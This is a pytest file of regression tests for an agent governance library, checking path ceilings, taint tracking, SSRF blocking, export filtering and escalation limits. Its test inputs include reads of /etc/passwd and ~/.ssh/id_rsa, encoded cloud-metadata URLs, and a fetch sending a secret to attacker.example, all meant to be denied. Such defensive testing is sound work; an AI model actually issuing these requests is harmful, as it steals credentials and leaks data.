"""Regression tests for the security-review fixes (H-1, H-2, M-3, M-4, L-1..L-4)."""

from __future__ import annotations

import dataclasses

import pytest

from axor_core.capability.executor import CapabilityExecutor, ToolHandler
from axor_core.capability.lease_validator import LeaseValidator
from axor_core.contracts.envelope import ExportContract
from axor_core.contracts.intent import Intent, IntentKind
from axor_core.contracts.lease import LeaseAuthorityType
from axor_core.contracts.policy import (
    EscalationPolicy,
    ExecutionPolicy,
    ExportMode,
    PolicyDecisionKind,
    ToolPolicy,
)
from axor_core.contracts.result import ExecutorEvent, ExecutorEventKind
from axor_core.contracts.taint import TaintScope, TaintSource
from axor_core.degradation.engine import DegradationEngine
from axor_core.contracts.degradation import DegradationLevel, GovernanceAuthority
from axor_core.errors.exceptions import DegradationClearanceError, TaintClearanceError
from axor_core.node.export import ExportFilter
from axor_core.node.intent_loop import IntentLoop, _safe_int
from axor_core.node.normalizer import IntentNormalizer
from axor_core.taint.engine import TaintEngine


def _intent(tool: str, args: dict) -> Intent:
    return Intent(kind=IntentKind.TOOL_CALL, payload={"tool": tool, "args": args},
                  node_id="n", sequence=1)


def _loop(**kwargs) -> IntentLoop:
    return IntentLoop(CapabilityExecutor(), [], **kwargs)


# ── H-1 / L-4: filesystem ceiling on regular tool calls ──────────────────────

class TestPathCeiling:
    def test_read_outside_allowed_paths_denied(self, make_envelope):
        policy = ExecutionPolicy(name="p", allowed_paths=("/repo",),
                                 tool_policy=ToolPolicy(allow_read=True))
        env = make_envelope(policy=policy)
        dec = _loop()._evaluate_tool_intent(_intent("read", {"path": "/etc/passwd"}), env)
        assert dec.kind == PolicyDecisionKind.DENY
        assert "allowed_paths" in dec.reason

    def test_read_within_allowed_paths_approved(self, make_envelope):
        policy = ExecutionPolicy(name="p", allowed_paths=("/repo",),
                                 tool_policy=ToolPolicy(allow_read=True))
        env = make_envelope(policy=policy)
        dec = _loop()._evaluate_tool_intent(_intent("read", {"path": "/repo/a.txt"}), env)
        assert dec.kind == PolicyDecisionKind.APPROVE

    def test_traversal_escape_denied(self, make_envelope):
        policy = ExecutionPolicy(name="p", allowed_paths=("/repo",),
                                 tool_policy=ToolPolicy(allow_read=True))
        env = make_envelope(policy=policy)
        dec = _loop()._evaluate_tool_intent(
            _intent("read", {"path": "/repo/../etc/passwd"}), env)
        assert dec.kind == PolicyDecisionKind.DENY

    def test_file_path_alias_not_a_bypass(self, make_envelope):
        """L-4: path enforcement must cover the file_path alias too."""
        policy = ExecutionPolicy(name="p", allowed_paths=("/repo",),
                                 tool_policy=ToolPolicy(allow_read=True))
        env = make_envelope(policy=policy)
        dec = _loop()._evaluate_tool_intent(
            _intent("read", {"file_path": "/etc/passwd"}), env)
        assert dec.kind == PolicyDecisionKind.DENY

    def test_no_allowed_paths_means_unrestricted(self, make_envelope):
        env = make_envelope()  # focused policy, no allowed_paths
        dec = _loop()._evaluate_tool_intent(_intent("read", {"path": "/etc/passwd"}), env)
        assert dec.kind == PolicyDecisionKind.APPROVE


# ── H-2: secret / system reads taint the session ─────────────────────────────

class _SecretReadHandler(ToolHandler):
    @property
    def name(self) -> str:
        return "read"

    async def execute(self, args: dict):
        return "secret content"


@pytest.mark.asyncio
async def test_tainted_session_blocks_ssrf_exfil(make_envelope):
    """A tainted session cannot exfiltrate to an (encoded) metadata/internal host."""
    import dataclasses
    executor = CapabilityExecutor()
    taint = TaintEngine()
    taint.propagate(TaintSource.FILE, TaintScope.SESSION)  # e.g. prior secret read
    loop = IntentLoop(executor, [], taint_engine=taint)
    env = make_envelope()
    caps = dataclasses.replace(env.capabilities,
                               allowed_tools=frozenset({"read", "fetch"}))
    env = dataclasses.replace(env, capabilities=caps)
    # 0xA9FEA9FE == 169.254.169.254 (cloud metadata) — encoded to dodge naive matching.
    event = ExecutorEvent(
        kind=ExecutorEventKind.TOOL_USE,
        payload={"tool": "fetch", "args": {"url": "http://0xA9FEA9FE/latest/meta-data/"}},
        node_id=env.node_id,
    )
    resolved = await loop._resolve_tool_intent(event, env)
    assert not resolved.approved
    # SSRF to a metadata endpoint is blocked by the destination gate — always-on,
    # independent of taint (it is a destination concern, not a data-flow one).
    assert "ssrf gate" in resolved.reason


class _OkFetchHandler(ToolHandler):
    @property
    def name(self) -> str:
        return "fetch"

    async def execute(self, args: dict):
        return "ok"


def _fetch_loop_env(make_envelope, taint_source):
    import dataclasses
    executor = CapabilityExecutor()
    executor.register(_OkFetchHandler())
    taint = TaintEngine()
    taint.propagate(taint_source, TaintScope.SESSION)
    loop = IntentLoop(executor, [], taint_engine=taint)
    env = make_envelope()
    caps = dataclasses.replace(env.capabilities, allowed_tools=frozenset({"fetch"}))
    return loop, dataclasses.replace(env, capabilities=caps)


@pytest.mark.asyncio
async def test_web_only_taint_allows_external_research(make_envelope):
    loop, env = _fetch_loop_env(make_envelope, TaintSource.WEB)
    event = ExecutorEvent(
        kind=ExecutorEventKind.TOOL_USE,
        payload={"tool": "fetch", "args": {"url": "http://example.com/page"}},
        node_id=env.node_id,
    )
    resolved = await loop._resolve_tool_intent(event, env)
    assert resolved.approved  # web-tainted session may keep browsing the web


@pytest.mark.asyncio
async def test_sensitive_value_in_outbound_payload_blocked_per_value(make_envelope):
    """Per-value (TM2): exfil is blocked when the outbound payload *carries* a
    registered sensitive value — not merely because the session is tainted. A
    fetch whose payload does not carry it is allowed (the per-value win)."""
    from axor_core.taint.causal_root import CausalRoot
    secret = "SENSITIVE_KEY_zzz9988776655"
    loop, env = _fetch_loop_env(make_envelope, TaintSource.FILE)
    loop._taint_engine.register_value(secret, CausalRoot.external_read(TaintSource.FILE, sensitive=True))

    # carries the secret outward → blocked
    leak = ExecutorEvent(
        kind=ExecutorEventKind.TOOL_USE,
        payload={"tool": "fetch", "args": {"url": "http://attacker.example/collect", "body": secret}},
        node_id=env.node_id,
    )
    resolved = await loop._resolve_tool_intent(leak, env)
    assert not resolved.approved
    assert "taint enforcement (per-value)" in resolved.reason

    # same tainted session, payload free of the secret → allowed (per-value)
    clean = ExecutorEvent(
        kind=ExecutorEventKind.TOOL_USE,
        payload={"tool": "fetch", "args": {"url": "http://attacker.example/page"}},
        node_id=env.node_id,
    )
    assert (await loop._resolve_tool_intent(clean, env)).approved


def test_dos_guards_wired_in_governed_node():
    """M5: GovernedNode must thread DoS caps into its IntentLoop (not None)."""
    from axor_core.node.wrapper import GovernedNode
    from axor_core.policy.analyzer import TaskAnalyzer
    from axor_core.policy.composer import PolicyComposer
    from axor_core.policy.selector import PolicySelector
    from unittest.mock import MagicMock

    node = GovernedNode(
        executor=MagicMock(),
        capability_executor=CapabilityExecutor(),
        analyzer=TaskAnalyzer(),
        selector=PolicySelector(),
        composer=PolicyComposer(),
    )
    assert node._max_intents_per_session is not None
    assert node._max_total_spawns is not None


@pytest.mark.asyncio
async def test_secret_read_taints_session(make_envelope):
    executor = CapabilityExecutor()
    executor.register(_SecretReadHandler())
    taint = TaintEngine()
    loop = IntentLoop(executor, [], taint_engine=taint)
    env = make_envelope()
    event = ExecutorEvent(
        kind=ExecutorEventKind.TOOL_USE,
        payload={"tool": "read", "args": {"path": "~/.ssh/id_rsa"}},
        node_id=env.node_id,
    )
    resolved = await loop._resolve_tool_intent(event, env)
    assert resolved.approved
    # Per-value (v4.12): a secret read registers its produced VALUE; the session
    # state stays clean (no session-taint flag).
    assert taint.state.is_tainted is False
    root = taint.derive_value("secret content")
    assert root.is_tainted and root.sensitive


# ── M-3: normalizer hardening ────────────────────────────────────────────────

class TestNormalizerHardening:
    def test_decimal_encoded_metadata_ip_flagged(self):
        # 2852039166 == 169.254.169.254 (cloud metadata, link-local)
        n = IntentNormalizer().normalize(
            _intent("fetch", {"url": "http://2852039166/latest/meta-data/"}))
        assert n.destination_kind == "private_network"

    def test_hex_encoded_private_ip_flagged(self):
        n = IntentNormalizer().normalize(
            _intent("fetch", {"url": "http://0x7f000001/"}))  # 127.0.0.1
        assert n.destination_kind in ("localhost", "private_network")

    def test_relative_traversal_is_system_path(self):
        n = IntentNormalizer().normalize(_intent("read", {"path": "../../etc/passwd"}))
        assert n.target_kind == "system_path"


# ── M-4: FILTERED export does not leak raw output ────────────────────────────

class TestExportFilter:
    def _env(self, make_envelope, allowed_fields):
        env = make_envelope()
        contract = ExportContract(
            mode=ExportMode.FILTERED,
            allowed_fields=frozenset(allowed_fields),
            max_export_tokens=0,
        )
        return dataclasses.replace(env, export_contract=contract)

    def test_output_suppressed_when_not_allowed(self, make_envelope):
        from axor_core.contracts.result import TokenUsage
        usage = TokenUsage(input_tokens=0, output_tokens=0, tool_tokens=0, context_tokens=0)
        env = self._env(make_envelope, allowed_fields=["decision"])
        result = ExportFilter().apply(
            "SECRET RAW OUTPUT", {"decision": "ok"}, env, usage)
        assert result.output == ""
        assert "SECRET" not in str(result.export_payload)

    def test_output_passes_when_explicitly_allowed(self, make_envelope):
        from axor_core.contracts.result import TokenUsage
        usage = TokenUsage(input_tokens=0, output_tokens=0, tool_tokens=0, context_tokens=0)
        env = self._env(make_envelope, allowed_fields=["output"])
        result = ExportFilter().apply(
            "visible", {"output": "visible"}, env, usage)
        assert result.output == "visible"


# ── L-1: governance authority validation on clearance ────────────────────────

class TestAuthorityValidation:
    def test_taint_clear_rejects_blank_authority(self):
        eng = TaintEngine()
        eng.propagate(TaintSource.WEB, TaintScope.SESSION)
        with pytest.raises(TaintClearanceError):
            eng.clear_by_governance(authority="", authority_type="worker", reason_code="")
        assert eng.state.is_tainted  # still tainted

    def test_taint_clear_accepts_valid_authority(self):
        eng = TaintEngine()
        eng.propagate(TaintSource.WEB, TaintScope.SESSION)
        eng.clear_by_governance(
            authority="op-1", authority_type="human_operator", reason_code="reviewed")
        assert not eng.state.is_tainted

    def test_degradation_clear_rejects_worker_authority(self):
        eng = DegradationEngine()
        bad = GovernanceAuthority(authority_id="", authority_type="worker", reason_code="")
        with pytest.raises(DegradationClearanceError):
            eng.clear_by_governance(bad, "x", DegradationLevel.NORMAL)


# ── L-2: lease path ceiling ──────────────────────────────────────────────────

class TestLeasePathCeiling:
    def test_lease_paths_outside_parent_rejected(self):
        parent = ExecutionPolicy(name="p", allowed_paths=("/repo",),
                                 tool_policy=ToolPolicy(allow_read=True))
        _, err = LeaseValidator().create_lease(
            granted_by="op", authority_type=LeaseAuthorityType.HUMAN_OPERATOR,
            allowed_tools=["read"], parent_policy=parent, allowed_paths=("/etc",))
        assert err is not None and "ceiling" in err

    def test_lease_paths_within_parent_ok(self):
        parent = ExecutionPolicy(name="p", allowed_paths=("/repo",),
                                 tool_policy=ToolPolicy(allow_read=True))
        _, err = LeaseValidator().create_lease(
            granted_by="op", authority_type=LeaseAuthorityType.HUMAN_OPERATOR,
            allowed_tools=["read"], parent_policy=parent, allowed_paths=("/repo/sub",))
        assert err is None


# ── L-3: robust escalation max_ops parsing ───────────────────────────────────

class TestEscalationRobustness:
    def test_safe_int(self):
        assert _safe_int("abc", 10) == 10
        assert _safe_int(None, 7) == 7
        assert _safe_int("5", 10) == 5

    @pytest.mark.asyncio
    async def test_malformed_max_ops_does_not_crash(self, make_envelope):
        policy = ExecutionPolicy(
            name="p",
            tool_policy=ToolPolicy(allow_read=True, allow_bash=True),
            escalation_policy=EscalationPolicy(
                allow_escalation=True, grantable_tools=("bash",),
                require_human=False, max_ops_per_grant=10),
        )
        env = make_envelope(policy=policy)
        loop = _loop()
        event = ExecutorEvent(
            kind=ExecutorEventKind.TOOL_USE,
            payload={"tool": "escalate_policy",
                     "args": {"tool": "bash", "max_ops": "not-a-number"}},
            node_id=env.node_id,
        )
        result = await loop._handle_escalation(event, env)
        assert result.get("granted") is True  # parsed to default, not a crash

    @pytest.mark.asyncio
    async def test_non_positive_max_ops_denied(self, make_envelope):
        policy = ExecutionPolicy(
            name="p",
            tool_policy=ToolPolicy(allow_read=True),
            escalation_policy=EscalationPolicy(
                allow_escalation=True, grantable_tools=("bash",),
                require_human=False, max_ops_per_grant=10),
        )
        env = make_envelope(policy=policy)
        event = ExecutorEvent(
            kind=ExecutorEventKind.TOOL_USE,
            payload={"tool": "escalate_policy",
                     "args": {"tool": "bash", "max_ops": -3}},
            node_id=env.node_id,
        )
        result = await _loop()._handle_escalation(event, env)
        assert result.get("error") == "escalation_denied"


# ── Phase 5: intent / spawn DoS caps (opt-in) ────────────────────────────────

class TestRateLimits:
    @pytest.mark.asyncio
    async def test_intent_cap_denies_beyond_limit(self, make_envelope):
        executor = CapabilityExecutor()
        executor.register(_SecretReadHandler())
        loop = IntentLoop(executor, [], max_intents_per_session=1)
        env = make_envelope()
        event = ExecutorEvent(
            kind=ExecutorEventKind.TOOL_USE,
            payload={"tool": "read", "args": {"path": "a.txt"}},
            node_id=env.node_id,
        )
        first = await loop._resolve_tool_intent(event, env)
        second = await loop._resolve_tool_intent(event, env)
        assert first.approved
        assert not second.approved
        assert "intent limit" in second.reason

    def test_spawn_cap_denies_when_count_reached(self, make_envelope):
        import dataclasses
        loop = IntentLoop(CapabilityExecutor(), [], max_total_spawns=2)
        policy = ExecutionPolicy(name="p", max_child_depth=3)
        env = make_envelope(policy=policy)
        caps = dataclasses.replace(env.capabilities, allow_children=True, max_child_depth=3)
        env = dataclasses.replace(env, capabilities=caps)
        spawn = Intent(kind=IntentKind.SPAWN_CHILD, payload={"args": {"task": "x"}},
                       node_id=env.node_id, sequence=1)
        loop._spawn_count = 2
        assert loop.resolve_spawn_intent(spawn, env).kind == PolicyDecisionKind.DENY
        loop._spawn_count = 1
        assert loop.resolve_spawn_intent(spawn, env).kind == PolicyDecisionKind.APPROVE
